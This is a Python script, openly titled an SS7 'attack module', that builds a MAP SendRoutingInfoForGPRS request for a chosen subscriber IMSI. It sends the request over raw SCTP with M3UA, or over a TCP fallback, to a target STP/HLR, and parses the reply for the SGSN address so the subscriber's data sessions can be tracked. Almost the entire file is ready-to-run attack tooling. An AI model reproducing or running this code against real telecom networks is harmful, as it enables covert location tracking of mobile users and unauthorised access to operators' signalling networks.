#!/usr/bin/env python
"""
SendRoutingInfoForGPRS (SRI-GPRS) Attack Module
Uses proper MAP ASN.1 encoding for real SS7 network interaction.
Retrieves SGSN address of target subscriber.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import SendRoutingInfoForGPRS

def srigprs_main():
    print("\n" + "=" * 50)
    print(" SendRoutingInfoForGPRS (SRI-GPRS) Attack")
    print(" Retrieve SGSN Address for Data Session Tracking")
    print("=" * 50 + "\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target IP (STP/HLR)", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    local_port = int(get_input("Local Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "1"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] Attack Parameters")
    print("-" * 30)
    imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)

    print("\n" + "=" * 50)
    print(" Building MAP SendRoutingInfoForGPRS Message")
    print("=" * 50)
    
    # Create MAP message with proper ASN.1 encoding
    srigprs = SendRoutingInfoForGPRS(imsi)
    tcap_data = srigprs.to_tcap_begin()
    
    print(f"[+] Target IMSI: {imsi}")
    print(f"[+] MAP Operation: SendRoutingInfoForGPRS (OpCode: 24)")
    print(f"[+] TCAP Message Size: {len(tcap_data)} bytes")
    
    # Show hex dump
    print("\n[+] TCAP/MAP Payload (Hex):")
    print("-" * 30)
    for i in range(0, len(tcap_data), 16):
        hex_part = ' '.join(f'{b:02x}' for b in tcap_data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in tcap_data[i:i+16])
        print(f"{i:04x}: {hex_part:<48} {ascii_part}")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        _sctp_attack(remote_ip, remote_port, local_port, opc, dpc, tcap_data)
    else:
        _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _sctp_attack(remote_ip, remote_port, local_port, opc, dpc, tcap_data):
    """SCTP transport."""
    print(f"\n[+] Sending SCTP to {remote_ip}:{remote_port}...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=local_port, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans is None:
            print("\n[-] No SCTP response. Trying TCP fallback...")
            _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data)
        elif ans.haslayer(SCTPChunkInitAck):
            print("[+] SCTP INIT-ACK received!")
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=local_port, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            if map_ans:
                print("\n[+] Response received!")
                if map_ans.haslayer(Raw):
                    _parse_srigprs_response(map_ans[Raw].load)
                else:
                    map_ans.show()
            else:
                print("[-] No MAP response (timeout)")
        elif ans.haslayer(SCTPChunkAbort):
            print("[-] SCTP ABORT. Trying TCP fallback...")
            _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data)
        else:
            print("[-] No SCTP INIT ACK. Trying TCP fallback...")
            _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        print("[*] Trying TCP fallback...")
        _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_srigprs_attack(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data)

    print("\n" + "=" * 50)
    print(" SRI-GPRS Attack Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] Response received!\033[0m")
        for key, val in result.items():
            if key not in ('success', 'raw', 'error', 'tcap'):
                print(f"\033[32m[+] {key.upper()}: {val}\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")


def _parse_srigprs_response(data):
    """Parse SendRoutingInfoForGPRS response."""
    print("\n" + "=" * 50)
    print(" SendRoutingInfoForGPRS Response")
    print("=" * 50)
    
    print(f"[+] Response Size: {len(data)} bytes")
    print("[+] Raw Response (Hex):")
    for i in range(0, min(len(data), 64), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        print(f"    {hex_part}")
    
    # Try to extract addresses using shared parser
    try:
        from ss7.attacks.tcp_transport import extract_addresses, parse_map_error
    except ImportError:
        from tcp_transport import extract_addresses, parse_map_error

    addrs = extract_addresses(data)
    if addrs:
        for key, val in addrs.items():
            print(f"\033[32m[+] {key.upper()}: {val}\033[0m")

    err_code, err_name = parse_map_error(data)
    if err_code is not None:
        print(f"\033[31m[-] MAP Error: {err_code} ({err_name})\033[0m")


if __name__ == "__main__":
    srigprs_main()
